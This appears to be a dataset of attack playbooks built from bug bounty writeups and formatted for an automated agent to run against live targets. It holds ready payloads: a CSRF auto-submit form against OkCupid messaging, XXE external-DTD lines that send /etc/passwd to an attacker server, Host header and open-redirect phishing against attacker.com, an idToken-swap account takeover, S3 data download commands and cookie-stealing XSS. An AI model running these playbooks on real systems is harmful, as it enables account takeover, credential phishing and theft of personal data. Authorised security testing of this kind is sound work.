description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: how to be popular

trigger_conditions.when_to_apply: When the target application's messaging endpoint accepts POST requests with a JSON body and does not implement CSRF protection for these requests.
prerequisites: The attacker must be able to host a webpage that a victim can visit.
applicability_signals: POST requests to /1/apitun/messages/send observed with JSON payloads.
Absence of CSRF tokens in requests to /1/apitun/messages/send.
skip_if: A valid CSRF token is required for the /1/apitun/messages/send endpoint.
The messaging endpoint only accepts GET requests or has other strong validation mechanisms that prevent cross-origin form submissions.

recon_steps: Step 1: Intercept requests to the OkCupid messaging endpoint (e.g., /1/apitun/messages/send) using a proxy like Burp Suite.
Step 2: Analyze the request to confirm it's a POST request and observe the JSON-encoded request body.
Step 3: Check for the presence of CSRF tokens in headers or request parameters.
attack_steps: Step 1: Create an HTML page with a hidden form that auto-submits via JavaScript upon page load.
Step 2: Set the form's action attribute to the OkCupid messaging endpoint: https://www.okcupid.com/1/apitun/messages/send.

Step 3: Dynamically construct the JSON payload for the message send request and attempt to embed it within the form submission. This involves manipulating the 'name' and 'value' attributes of hidden input fields to form a valid JSON string when the browser performs form encoding.
Step 4: Host this HTML page on a web server.
Step 5: Send the link to the victim. When the victim visits the link, their browser will automatically submit the form, sending the crafted message from their account.
payloads_or_patterns: <form id='form' method='post' action='https://www.okcupid.com/1/apitun/messages/send'><input style='display:none' name='{"receiverid": "<VICTIM_USER_ID>", "body": "<MESSAGE_BODY>"}' value='{}'><input type='submit' value='Click me'></form><script>window.onload = () => {form.submit()}</script>
tools_recommended: Burp Suite: To intercept and analyze HTTP requests.
A simple HTTP server (e.g., Python's http.server): To host the malicious HTML file.
success_indicators: The victim's browser successfully submits the form to the OkCupid endpoint.
A message is sent from the victim's OkCupid account to the specified receiverid with the crafted body, observable by the attacker or the victim.
failure_indicators: The browser returns an error indicating invalid JSON or an invalid request body, suggesting the payload construction failed or the server rejected the malformed JSON. Pivot: Re-examine the form encoding to JSON conversion logic, potentially trying different input field structures or encoding tricks.

A CORS error or other cross-origin request blocking is encountered, indicating the form submission method might be insufficient. Pivot: Explore alternative cross-origin request methods if available, or check if the target has specific CORS policies that can be bypassed.

playbooks.impact: An attacker can send messages from any logged-in victim's account to any other user on OkCupid, impersonating the victim.
playbooks.key_lesson: Always validate that cross-origin POST requests, especially those with JSON bodies, are protected against CSRF by checking for valid CSRF tokens or other appropriate mitigation strategies, even if CORS headers are not present.

meta.title: Bug bounty - PHI/PII critical data exposure

trigger_conditions.when_to_apply: When a SaaS application allows the creation of public waiting lists and an unauthenticated API endpoint exists to retrieve the details of these lists.
prerequisites: Attacker can identify public waiting list URLs for the target SaaS application.
applicability_signals: Publicly accessible waiting list pages exist on the target domain (e.g., `company.com/l/<waiting_list_name>`).
An API endpoint is observed making requests to retrieve waiting list data, e.g., `https://api.company.com/v2/public/visits/<nameofmywaitinglist>?limit=200`.
skip_if: API responses for waiting lists are empty or do not contain Personally Identifiable Information (PII) or Protected Health Information (PHI).

recon_steps: Step 1: Use Google dorking to discover public waiting lists for the target domain (e.g., `site:company.com inurl:/l/`).
Step 2: Visit a discovered public waiting list URL to understand its structure and observe network requests made by the browser using developer tools (e.g., Firefox Developer Tools).
attack_steps: Step 1: Identify the API endpoint used to retrieve the list of people in a waiting list (e.g., `https://api.company.com/v2/public/visits/<waiting_list_name>?limit=200`).
Step 2: Access the identified API endpoint directly using a tool like `curl` or a browser.
Step 3: Observe the response for sensitive information provided by users during registration.
tools_recommended: Google Dorks
Firefox Developer Tools
curl
success_indicators: API response contains sensitive PII (e.g., First Name, Last Name, Address, Phone Number) or PHI (e.g., health information) for individuals registered in the waiting list.
failure_indicators: API response contains no PII/PHI or is empty. Pivot to look for other types of information disclosure or vulnerabilities.

playbooks.impact: Exposure of sensitive Personally Identifiable Information (PII) and Protected Health Information (PHI) of individuals registered on public waiting lists, potentially leading to identity theft, fraud, or privacy violations.
playbooks.key_lesson: Always inspect API requests made by web applications, especially those retrieving data for public-facing features, as they may inadvertently expose sensitive user information.

meta.title: Missing permission check for Facebook gaming community invites

trigger_conditions.when_to_apply: When a user is invited as a community manager for a Facebook gaming creator and can access their pending invites list.
prerequisites: Attacker must be a logged-in Facebook user.
Target user must have invited someone as a community manager.
applicability_signals: The existence of a gaming community invite system where pending lists are expected to be private.
Previous research indicating similar permission check issues on Facebook.
skip_if: The pending invite list is confirmed to be properly secured and only accessible by the creator and invited users.

recon_steps: Step 1: Identify how Facebook gaming community invites are managed and if there is a specific endpoint for pending invites.
Step 2: Attempt to access the pending invites list for a gaming creator as a regular authenticated user.
attack_steps: Step 1: Initiate the process of inviting a user as a community manager for a gaming creator.
Step 2: After an invite is sent, attempt to access the list of pending community manager invites associated with that creator's gaming page using the authenticated user's session.
Step 3: Observe the response to determine if the pending invite list of another user (or a list not intended for the current user) is exposed.
payloads_or_patterns: API calls to endpoints related to gaming community management. The writeup implies the vulnerability was in accessing the 'community_manager_invite_profiles' which suggests a direct API call or a user-facing feature that queries this data. Specific endpoint is not detailed.
tools_recommended: Burp Suite or OWASP ZAP to intercept and analyze network requests related to Facebook gaming features.
success_indicators: The response contains a list of pending community manager invites that do not belong to the attacker's own invites or the creator's invites that the attacker should not have access to.
Exposed user IDs or profile information of individuals who have been invited but have not yet accepted.
failure_indicators: Receiving a 403 Forbidden or similar error when attempting to access the pending invites list.
The response only shows invites relevant to the attacker's own actions or the creator's explicit management actions, indicating proper authorization.

playbooks.impact: An attacker can view a list of pending community manager invites for Facebook gaming creators, potentially revealing information about who is being considered for moderation roles. This could lead to privacy concerns or targeted social engineering if the invited users' identities are exposed.
playbooks.key_lesson: Always verify that access to lists of pending invitations or requests is restricted to only those users who have the explicit right to view them, even if the data itself is not highly sensitive.

meta.title: Bug Bounty Stories #1: Tale of CSP bypass in an electron app!

trigger_conditions.when_to_apply: When an Electron application enforces a Content Security Policy (CSP) that allows scripts with nonces but generates nonces with weak entropy, specifically where the initial part of the nonce appears to be an epoch timestamp.
prerequisites: The target is an Electron application.
The application enforces a Content Security Policy (CSP).
The CSP allows scripts with a 'nonce' attribute.
User-controlled input is rendered within the application.
applicability_signals: CSP header present in responses.
CSP policy explicitly disallows 'unsafe-eval' and 'unsafe-inline'.
CSP policy explicitly allows scripts with 'nonce'.
Observed nonce values in script tags appear to have predictable patterns, such as starting with an epoch timestamp.
skip_if: CSP policy allows 'unsafe-eval' or 'unsafe-inline'.
CSP policy does not use nonces for script execution.
Nonce generation uses cryptographically secure random number generation.
No observable content injection or XSS vulnerabilities are present.

recon_steps: Step 1: Inspect HTTP response headers for Content Security Policy (CSP) directives.
Step 2: Identify script tags within the application's HTML content and observe the presence and format of 'nonce' attributes.
Step 3: Analyze the structure of the observed nonce values for any predictable patterns, particularly looking for epoch timestamps at the beginning.
attack_steps: Step 1: Craft a script payload that can be injected into the application (e.g., via a content injection vulnerability).

Step 2: Construct a malicious script tag. Instead of relying on 'unsafe-inline', use the 'nonce' attribute. The value of the nonce can be determined by observing the initial epoch timestamp part from a legitimate script tag and appending any predictable characters.
Step 3: Inject the crafted script tag into a vulnerable input point within the Electron app.
Step 4: Observe if the injected script executes, confirming CSP bypass.
tools_recommended: Browser Developer Tools: To inspect CSP headers and analyze HTML content.
Custom scripts: To analyze nonce patterns and craft payloads.
success_indicators: Execution of injected JavaScript code (e.g., `alert(1)`).
Observable changes in the application's behavior due to the executed script.
failure_indicators: The injected script is not executed, and the CSP policy remains effective.
Errors related to invalid nonce values or CSP violations are observed in the browser console.

playbooks.impact: Execution of arbitrary JavaScript code within the Electron application's context, potentially leading to data exfiltration, session hijacking, or further exploitation of the application's local resources.
playbooks.key_lesson: When a CSP uses nonces, analyze the nonce generation algorithm for weaknesses; predictable or short-entropy nonces can be bypassed by observing and replicating their pattern.

meta.title: How I could have hacked your medium account by phishing your FB, Twitter & Google credentials.

affected_components: Sign in with social media buttons (e.g., Twitter)
tech_stack_fingerprints: HTML structure related to login and social sign-in buttons

trigger_conditions.when_to_apply: When the target application allows redirection after authentication attempts using social media accounts and accepts a 'redirect' parameter.
prerequisites: Ability to interact with the application's login flow.
applicability_signals: Presence of parameters like `?redirect=` or similar redirection-related query parameters in URLs, especially around login or authentication flows.
Clicking 'Sign in with [Social Media]' buttons leads to intermediate URLs that accept a redirection parameter.
skip_if: All redirects are hardcoded and do not accept user-controlled parameters.
A strict Content Security Policy (CSP) prevents redirects to external domains.

recon_steps: Step 1: Use tools like Waybackurls, ParamSpider, and Gau to discover parameters on Medium.com.
Step 2: Manually explore the Medium website and spider the application using Burp Suite to identify interesting parameters and endpoints, particularly around login and authentication.

Step 3: Search for common open redirection parameters such as `?next=`, `?url=`, `?target=`, `?rurl=`, `?dest=`, `?destination=`, `?redir=`, `redirect_uri=`, `?redirect_url=`, `?redirect=`, `/redirect/`, `cgi-bin/redirect.cgi?{}`, `/out/`, `/out?`, `?view=`, `/login?to=`, `?image_url=`, `?go=`, `?return=`, `?returnTo=`, `?return_to=`, `?checkout_url=`.
attack_steps: Step 1: Identify the 'Sign in with Twitter' button or similar social sign-in mechanisms on Medium.com.
Step 2: Observe the URL generated when clicking the 'Sign in with Twitter' button. Look for a redirection parameter (e.g., `redirect=`).

Step 3: Construct a malicious URL by replacing the intended redirect destination with an attacker-controlled domain (e.g., `attacker.com`). The URL might look like: `<TARGET_URL>/path/to/social/auth?redirect=attacker.com` (exact path to be determined during recon).
Step 4: Craft a phishing page on `attacker.com` that mimics the Medium login page or requests social media credentials.
Step 5: Send the crafted malicious URL to a target user via phishing or other social engineering methods.

Step 6: When the user clicks the link and attempts to sign in with Twitter, they will be redirected to the attacker's domain (`attacker.com`) instead of Medium's intended page, where their credentials can be captured.
tools_recommended: Burp Suite (for spidering, proxying, and manual exploration)
Waybackurls, ParamSpider, Gau (for URL and parameter discovery)
success_indicators: The user is redirected to the attacker-controlled domain (`attacker.com`) after clicking the 'Sign in with Twitter' button.
The attacker's phishing page successfully captures the user's social media credentials.
failure_indicators: The redirect parameter is not present or is sanitized, preventing redirection to an external domain (e.g., redirect to a default Medium page). Pivot: Look for other parameters that might control redirection or other vulnerabilities like reflected XSS.
The social media OAuth flow does not involve a user-controllable redirect parameter.

playbooks.impact: Attacker can phish user's Facebook, Twitter, and Google credentials by exploiting the open redirect vulnerability linked to social media logins on Medium. This allows the attacker to gain unauthorized access to the user's Medium account and potentially other accounts linked to those social media credentials.
playbooks.key_lesson: Always scrutinize redirection parameters in authentication flows, especially those involving third-party OAuth providers, as they can be exploited for phishing and account takeover.

meta.title: How I earned $$$$ by Amazon S3 Bucket misconfigurations?

trigger_conditions.when_to_apply: When a company uses S3 buckets to store application assets (images, JS, invoices) and the bucket names follow a predictable pattern based on subdomains or environments.
prerequisites: Ability to query S3 bucket existence and permissions.
applicability_signals: Discovering subdomains that serve assets from S3 buckets (e.g., qa-media.company)
Predictable naming conventions for S3 buckets (e.g., `[environment]-media.company`)
skip_if: All discovered S3 buckets return 'AccessDenied' for listing and no sensitive files are found.
The company does not appear to use S3 for storing application assets.

recon_steps: Step 1: Identify subdomains associated with the target domain (e.g., qa-media.company, prod-media.company).
Step 2: For each identified subdomain, check if it resolves to an S3 bucket URL (e.g., https://<bucket-name>.s3.amazonaws.com/).
Step 3: Use `aws s3 ls s3://<bucket-name>/` to list the contents of the bucket.
attack_steps: Step 1: Attempt to list objects within the S3 bucket using `aws s3 ls s3://<bucket-name>/`.
Step 2: If listing is successful and does not return 'AccessDenied', enumerate common directories like 'invoices', 'assets', 'files', 'images'.
Step 3: Download files from identified sensitive directories (e.g., PDF invoices) using `aws s3 cp s3://<bucket-name>/<file-path> .`.
Step 4: Analyze downloaded files for sensitive information like PII.
Step 5: If full permissions (copy, move, delete) are found on a bucket, report it even if sensitive files are not immediately apparent.
Step 6: Use subdomain enumeration tools (e.g., `ffuf`) with a custom wordlist and the S3 bucket URL pattern to discover additional buckets based on known naming conventions.
tools_recommended: awscli: For interacting with S3 buckets (ls, cp, mv, rm).
S3Scanner: For automated scanning of S3 buckets.
s3-buckets-finder: Tool for discovering S3 buckets.
ffuf: For brute-forcing bucket names and paths.
success_indicators: Successful listing of bucket contents without 'AccessDenied'.
Download of files containing sensitive information (PII, financial data).
Confirmation of write/delete permissions on an S3 bucket.
Discovery of multiple accessible S3 buckets by enumerating predictable names.
failure_indicators: All 'aws s3 ls' commands return 'AccessDenied'. Suggestion: Investigate other vulnerability types.
No sensitive files found after extensive enumeration. Suggestion: Move to different target or subdomain.
Bucket names are not predictable and brute-forcing yields no results. Suggestion: Focus on identified subdomains if they serve from S3.

playbooks.impact: Exposure of sensitive customer data (PII, financial details) via publicly accessible S3 buckets. Unauthorized modification or deletion of bucket contents if write permissions are misconfigured.
playbooks.key_lesson: Automate the discovery and inspection of S3 buckets associated with subdomains and predictable naming patterns, checking for both read and write permissions and sensitive data exposure.

meta.title: Information Disclosure to Account Takeover

trigger_conditions.when_to_apply: When the /proxyservices/v1/users/validate endpoint returns user details including an 'idToken' for a user signed up via OAuth (e.g., Google).
prerequisites: Target uses OAuth for account registration/login.
Attacker can register or obtain an email address associated with OAuth.
applicability_signals: Response from /proxyservices/v1/users/validate?searchUser=<email> contains an 'idToken' parameter.
skip_if: The /proxyservices/v1/users/validate endpoint does not return an 'idToken'.

recon_steps: Step 1: Send a GET request to https://<TARGET_URL>/proxyservices/v1/users/validate?searchUser=<victim_email> to identify if an 'idToken' is returned in the response for a victim's email.
Step 2: If an 'idToken' is present, proceed to attacker's OAuth login flow.
attack_steps: Step 1: Obtain the 'idToken' for a victim's email by querying https://<TARGET_URL>/proxyservices/v1/users/validate?searchUser=<victim_email>.
Step 2: Log in as the attacker using their own OAuth account (e.g., Google) and intercept the login request.
Step 3: In the intercepted POST request to /proxyservices/v1/auth/add/SocialMailUser, replace the attacker's 'idToken' with the victim's 'idToken' obtained in Step 1.
Step 4: Submit the modified request.
payloads_or_patterns:
GET /proxyservices/v1/users/validate?searchUser=<Victims_email>

POST /proxyservices/v1/auth/add/SocialMailUser HTTP/1.1
Host: <TARGET_URL>
...

idToken: <Victims_idToken>
authType: SOCIAL_GMAIL
genPassword: <genpassword_value>
tools_recommended: Burp Suite: To intercept and modify HTTP requests.
success_indicators: Attacker successfully logs into the victim's account without the victim's interaction.
The response from POST /proxyservices/v1/auth/add/SocialMailUser indicates a successful login or account association.
failure_indicators: 400 Bad Request or 401 Unauthorized response when submitting the modified request → the 'idToken' might be tied to the session or requires specific validation. Try obtaining a fresh 'idToken' or investigate the 'genPassword' parameter.
Any response other than a successful login → implies the 'idToken' alone is insufficient or has other validation checks.

playbooks.impact: Complete takeover of any user account that has signed up using an OAuth flow or connected social accounts.
playbooks.key_lesson: When information disclosure endpoints reveal OAuth tokens or sensitive authentication-related parameters, investigate if these tokens can be reused or swapped in authentication endpoints to impersonate other users.

meta.title: Pre-Auth RCE in Moodle Part I - PHP Object Injection in Shibboleth Module

trigger_conditions.when_to_apply: When the Shibboleth authentication module is enabled in Moodle and the session handler is configured to use file-based sessions.
prerequisites: Moodle instance with Shibboleth module installed and enabled.
Session handler configured to `core\session\file` (default).
applicability_signals: Shibboleth module actively used for authentication.
skip_if: Moodle version is patched.
Session handler is not file-based (e.g., database, memcache).

recon_steps: Step 1: Identify Moodle instance and check for Shibboleth module presence (e.g., via login page variations or known paths).
Step 2: If Shibboleth is present, attempt to trigger the logout functionality via SOAP to observe the response and identify the session ID.
attack_steps: Step 1: Craft a PHP Object Injection payload that, when unserialized by Moodle's `core\session\file` handler, leads to arbitrary code execution. This typically involves creating a serialized PHP object with a malicious `__destruct` or `__wakeup` method.

Step 2: Inject this payload into a Moodle session file that will be processed during the logout notification. This might involve finding an existing session file or influencing the creation of a new one.

Step 3: Trigger the `LogoutNotification` function via SOAP with a crafted `$spsessionid` that matches the session file containing the malicious payload. The session file will be read, deserialized (leading to object injection), and the `unlink` operation will be bypassed or manipulated to achieve RCE.
payloads_or_patterns: A crafted serialized PHP object exploiting `unserialize()` vulnerability. Example: `O:1:"a":1:{s:4:"func";s:5:"system";}O:1:"b":1:{s:8:"$callback";s:10:"phpinfo();";}` (Conceptual - actual exploit requires deeper understanding of Moodle's session structure and gadget chains).
tools_recommended: Burp Suite (for intercepting and modifying SOAP requests).
PHPGGC (PHP Generic Gadget Chains) to find suitable gadget chains for PHP Object Injection.
success_indicators: Arbitrary code execution confirmed, e.g., receiving output from `phpinfo()`, executing a reverse shell, or writing a file to the server.
HTTP response from the SOAP request indicating an error that is not a standard logout error, potentially revealing unexpected behavior.
failure_indicators: SOAP request returns a standard 'Could not delete Moodle session file' error or a generic error without signs of code execution.
No observable impact on the server. Pivot: Try different gadget chains or investigate other session handling mechanisms if available.

playbooks.impact: Allows an unauthenticated attacker to execute arbitrary code on the Moodle server with the privileges of the web server process, leading to full system compromise.
playbooks.key_lesson: Always scrutinize the deserialization process (`unserialize()`) in applications, especially when dealing with user-controlled input or data retrieved from storage, as it can lead to PHP Object Injection and Remote Code Execution.

meta.title: XSS-Special-Cases: XSS That Works only in mobile Devices

trigger_conditions.when_to_apply: When a website employs a Web Application Firewall (WAF) that blocks common XSS payloads and event handlers, but allows mobile-specific event handlers, and the target site is accessible via a mobile device or mobile device simulation.
prerequisites: Target application reflects user-supplied input in the HTML response.
WAF is present and blocks standard XSS payloads.
applicability_signals: Observation that 'all tags are blocked and mostly all event handlers are blocked'.
Successful reflection of normal strings (e.g., 'FUZZ') when not part of an event handler.
Specific mobile event handlers ('touchstart', 'touchmove', 'touchcancel', 'touchend') do not trigger WAF blocking and return a 200 OK status.
skip_if: WAF blocks all event handlers, including mobile-specific ones.
User input is not reflected in the HTML response.

recon_steps: Step 1: Perform passive reconnaissance to identify the target URL and any obvious parameters.
Step 2: Conduct active reconnaissance by sending standard XSS payloads to various parameters to observe WAF behavior and input reflection.
Step 3: Identify parameters that reflect user input but are blocked when used with standard XSS payloads.
attack_steps: Step 1: Identify a parameter that reflects user input (e.g., 'name' in the writeup) where standard XSS payloads are blocked.
Step 2: Construct a payload using mobile-specific event handlers such as 'ontouchend' combined with a JavaScript execution payload (e.g., 'alert(document.cookie)').
Step 3: Send the crafted payload to the identified parameter, ensuring the request is made from a mobile device or using a mobile device simulator (e.g., Chrome DevTools Toggle Device Toolbar).
Step 4: Observe the response for the execution of the JavaScript payload.
tools_recommended: Burp Suite: To intercept and modify requests.
Chrome DevTools: For simulating mobile devices using 'Toggle Device Toolbar'.
success_indicators: An alert box pops up displaying the document's cookies.
The JavaScript payload within the 'ontouchend' event handler executes successfully.
failure_indicators: The WAF blocks the request and returns a 403 Forbidden status code.
The payload is reflected but the JavaScript does not execute, indicating the event handler is not being processed or is otherwise ineffective.
If the target is not simulated as a mobile device, the payload will likely not trigger.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser on a mobile device, leading to session hijacking (via cookie theft), defacement, or further exploitation.
playbooks.key_lesson: When standard XSS payloads are blocked by a WAF, investigate mobile-specific event handlers and test within a mobile device or simulated mobile environment.

meta.title: You’ve Got (a Reset) Mail: A Security Analysis of Email-Based Password Reset Procedures

tech_stack_fingerprints: Emails containing reset links with Host header customization opportunities

trigger_conditions.when_to_apply: When a web application sends an email with a password reset link and allows manipulation of the Host header or similar parameters in the generated URL.
prerequisites: Attacker must be able to trigger the password reset functionality for a target user.
The application must be vulnerable to Host header injection or similar mechanisms that affect the generated reset link.
applicability_signals: Password reset emails contain a link with a domain that can be influenced by the Host header.
The password reset token is embedded in the URL.
The application does not properly validate the Host header before generating links.
skip_if: The application strictly validates the Host header against a pre-defined allowlist.
Password reset tokens are not discoverable or are single-use and immediately invalidated upon use.

recon_steps: Step 1: Identify a target user and initiate the password reset process on the application.
Step 2: Observe the content of the password reset email received, paying close attention to the URL provided for resetting the password.
Step 3: Analyze the structure of the reset URL to identify if any part of the domain or subdomain can be manipulated via HTTP headers.
attack_steps: Step 1: Send a crafted HTTP request to the application's password reset endpoint, including a malicious `Host` header (e.g., `Host: attacker-controlled.com`).
Step 2: Trigger the password reset for a target user.
Step 3: If successful, the application will generate a password reset email where the link points to the attacker's controlled domain. The email should contain a unique reset token.
Step 4: Capture the reset token from the email.
Step 5: Craft a POST request to the reset endpoint on the attacker's controlled domain, using the captured token and a new password, to attempt to reset the target user's password.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, particularly to inject malicious Host headers.
Mailcatcher or similar: To inspect incoming emails and extract reset tokens.
success_indicators: The password reset email contains a link pointing to the attacker's controlled domain.
A successful password reset request using the captured token on the attacker's domain changes the target user's password.
failure_indicators: The password reset email still contains the original application domain in the link, indicating Host header manipulation was ineffective.
The application returns an error or the reset link is invalid, suggesting stricter validation or a different vulnerability.

playbooks.impact: Account takeover of the target user by intercepting the password reset link and setting a new password.
playbooks.key_lesson: Always validate the `Host` header rigorously and use it as a trusted source for generating redirect URLs, especially in sensitive functions like password resets.

meta.title: Slides

trigger_conditions.when_to_apply: When the target application allows users to reset their password or upload files, and the mechanism for identifying or referencing these resources is predictable and potentially manipulable.
prerequisites: Ability to interact with password reset or file upload features.
applicability_signals: Observing predictable identifiers or parameters related to password reset tokens or uploaded files in API requests or URLs.
The existence of functionality that allows users to manage or retrieve previously uploaded files or password reset links.
skip_if: Password reset tokens are highly randomized and have short expiry times.
File identifiers are cryptographically secure hashes or GUIDs.
No observable parameters are associated with file access or password reset links.

recon_steps: Step 1: Analyze network traffic during password reset and file upload operations to identify any parameters or identifiers used.
Step 2: Attempt to manipulate identified parameters (e.g., token, file ID) to see if resources belonging to other users can be accessed or modified.
attack_steps: Step 1: Initiate a password reset for a known user account (if possible) and capture the request/response.
Step 2: Examine the password reset token for predictable patterns or enumerability.
Step 3: If predictable, attempt to reset the password for other potential user accounts by guessing or enumerating tokens.
Step 4: If file upload functionality is present, upload a file and capture the request/response to identify the file's identifier.
Step 5: Attempt to access or manipulate files uploaded by other users by guessing or enumerating file identifiers.
payloads_or_patterns: Common username patterns combined with a base token structure
tools_recommended: Burp Suite Intruder: To automate the enumeration of potential password reset tokens or file identifiers.
OWASP ZAP: For similar automated scanning and fuzzing capabilities.
success_indicators: Successfully resetting another user's password via token manipulation.
Accessing or viewing files uploaded by other users by manipulating file identifiers.
Receiving a confirmation email for a password reset that was not initiated by the attacker for another user.
failure_indicators: Receiving an invalid token error or file not found (404) for all guessed identifiers. Pivot: Investigate other potential vulnerabilities like CSRF or Host Header Injection if mentioned in the writeup.
All attempted actions result in permission denied (403) or unauthorized (401) errors, even with valid session tokens, suggesting robust access control.

playbooks.impact: Account takeover via password reset manipulation, unauthorized access to sensitive files uploaded by other users.
playbooks.key_lesson: When interacting with password reset or file management functionalities, always scrutinize the identifiers and tokens used for predictability and enumerability to prevent unauthorized access or account takeover.

meta.title: XXE Case Studies

affected_components: Any endpoint that parses XML input

trigger_conditions.when_to_apply: When the target accepts XML input or processes files that can contain XML (e.g., KML, PDF, ZIP archives), and the XML parser is vulnerable to external entity expansion.
prerequisites: Target accepts XML input
Target processes files containing XML
applicability_signals: Endpoints accepting `.xml` file uploads
Parameters named `strXML` or similar that accept raw XML
Functionality to upload proprietary file types that might contain XML
Functionality to upload KML or PDF files
XML parser is in use on the backend
skip_if: XML parser is configured to disable external entity processing
Input is strictly validated against a known schema without XXE risks
All XXE payloads are blocked by a WAF

recon_steps: Step 1: Identify endpoints that accept XML file uploads or XML data as parameters.
Step 2: Use Burp Suite's passive scanning or custom profiles to detect XML in requests.
Step 3: If the target allows proprietary file uploads, analyze the file structure (e.g., unzip and inspect contents for XML files).
Step 4: For KML/PDF uploads, download sample files and analyze their structure, looking for XML content.
attack_steps: Step 1: For endpoints accepting raw XML, send a basic XXE payload to an external DTD to test for blind XXE, e.g., `strXML=<payload>`
Step 2: For file uploads (KML, PDF, ZIP), craft a malicious file containing an XXE payload in the XML structure.
Step 3: For KML/PDF files, append the XXE payload to a downloaded sample file.
Step 4: For ZIP files, replace an XML file within the archive with a malicious one.
Step 5: Host a malicious DTD on a controlled server to exfiltrate data (e.g., `file:///etc/passwd`).
Step 6: Use Burp Intruder to scan for open ports by observing differing Content-Length responses for internal port scans.
payloads_or_patterns: For basic XXE with external DTD: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<your-server>/malicious.dtd"> %xxe;]>`
External DTD example: `<!ENTITY % p1 SYSTEM "file:///etc/passwd"> <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://<your-server>/?x=%p1;'>"> %p2;`

Payload for file exfiltration via strXML parameter: `strXML=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE testingxxe [<!ENTITY xxe PUBLIC "xxe" "http://localhost:21/" > ]><data><xxx><xxx>194147</xxx></xxx><identity>&xxe;</identity></data>`
Payload for KML file: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>/malicious.dtd?ext=file:///etc/passwd"> %xxe;]>`
Payload for PDF/Proprietary file: `<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE cinzinga SYSTEM "http://poc.cinzinga.com/test.dtd"><cinzinga>&e1;</cinzinga>`
tools_recommended: Burp Suite (for proxying, active scanning, Intruder)
Burp Bounty extension (for custom passive profiles)
Strings (for analyzing proprietary file types)
7-Zip or equivalent (for unzipping archives)
Flask (for hosting a simple web server)
Tib3rius's tool (mentioned for KML XXE)
oXML XXE tool on GitHub (for PDF XXE generation)
Your own web server for receiving exfiltrated data
success_indicators: Content of sensitive files (e.g., `/etc/passwd`, `win.ini`) received on your controlled web server.
Successful internal port scan indicated by differing content lengths for open vs. closed ports.
Specific error messages or response structures that reveal internal system details.
failure_indicators: All XXE payloads are rejected or lead to generic errors (e.g., 400 Bad Request, 500 Internal Server Error) → indicates potential WAF or parser mitigation. Try different bypass techniques or less common XML structures.
No data exfiltrated to the controlled server → verify DTD structure, URL encoding, and firewall rules. Ensure the target can reach your server.
Content-Length difference for port scanning is not observed → try a wider range of ports or different probing methods.

playbooks.impact: Exfiltration of sensitive files (e.g., `/etc/passwd`, configuration files, source code), internal network scanning, potential denial of service, or triggering remote code execution if XXE can be leveraged for other vulnerabilities.
playbooks.key_lesson: Always test XML parsing functionality, including file uploads and parameters, for XXE vulnerabilities. Leverage external DTDs for blind XXE and data exfiltration.

meta.title: Mattermost Server v5.32 > v5.36 Reflected XSS in OAuth flow

trigger_conditions.when_to_apply: When the target Mattermost server is running a version between v5.32 and v5.36, and the OAuth flow is accessible.
prerequisites: The Mattermost server must be reachable and the OAuth flow must be enabled or accessible.
applicability_signals: Presence of an OAuth endpoint, specifically one that might redirect or handle errors using the `redirect_to` parameter.
skip_if: Mattermost server version is outside the vulnerable range.
WAF blocks requests containing JavaScript payloads in URL parameters.

recon_steps: Step 1: Identify the Mattermost OAuth callback endpoint. This often follows a pattern like `/login/sso/saml`, `/login/gitlab/` or similar, but the writeup points to the internal `completeOAuth` function which implies it's part of the handling of an OAuth redirect.
Step 2: Attempt to trigger the OAuth flow and observe the parameters accepted by the server. Look for parameters like `redirect_to` or similar redirection hints.
attack_steps: Step 1: Craft a URL that initiates the OAuth flow and includes a malicious payload in the `redirect_to` parameter. The payload should be a JavaScript snippet that triggers an action, like `alert()`.
Step 2: Send a GET request to the crafted URL.
Step 3: Observe the response for the reflected payload and the execution of the JavaScript.
tools_recommended: Burp Suite: To intercept, modify, and replay HTTP requests, and to automate the testing of different payloads.
Browser Developer Tools: To inspect the HTML response and verify JavaScript execution.
success_indicators: The JavaScript payload (e.g., `alert(document.domain)`) executes successfully in the browser, indicating a reflected XSS vulnerability.
The `redirect_to` URL parameter is reflected unsanitized within the HTML of the error page returned by the server.
failure_indicators: A 4xx or 5xx error code without reflection of the payload, possibly indicating input sanitization or a different vulnerability.
A 302 redirect to a safe URL without JavaScript execution, suggesting the `redirect_to` parameter is handled securely.
A WAF block page (e.g., 403 Forbidden) indicates that the payload might be too obvious or that the WAF is effective.

playbooks.impact: An unauthenticated attacker can craft a malicious URL that, when visited by a victim user, executes arbitrary JavaScript in the victim's browser within the context of the Mattermost domain. This can lead to session hijacking, data exfiltration (e.g., reading sensitive messages), or perform actions on behalf of the victim.
playbooks.key_lesson: Always test URL parameters used in redirects or within HTML responses for unsanitized user input that could lead to Reflected Cross-Site Scripting (XSS).

meta.title: HackerOne report

trigger_conditions.when_to_apply: This technique applies when a web application fails to properly sanitize user input before reflecting it back in the response, leading to arbitrary JavaScript execution in the user's browser.
prerequisites: JavaScript enabled in the target browser.
applicability_signals: The target application is a web application that accepts user input which is then rendered in the response.
A specific endpoint or feature is identified where input is reflected.
The writeup hints at Reflected XSS vulnerability.
skip_if: The target application consistently sanitizes all user input, preventing any script execution.
A Web Application Firewall (WAF) effectively blocks all common XSS payloads.

recon_steps: Step 1: Identify potential input vectors by browsing the target application and submitting various data types (text, special characters, HTML tags) to different forms, URL parameters, and API endpoints.
Step 2: Analyze HTTP responses for any reflected input. Use browser developer tools to inspect the DOM and identify where submitted data appears in the HTML source.
attack_steps: Step 1: Construct a simple XSS payload, e.g., `<script>alert(document.domain)</script>`.
Step 2: Inject the payload into an identified input vector.
Step 3: Observe the HTTP response. If the payload is reflected in the HTML source without proper encoding or sanitization, the JavaScript should execute.
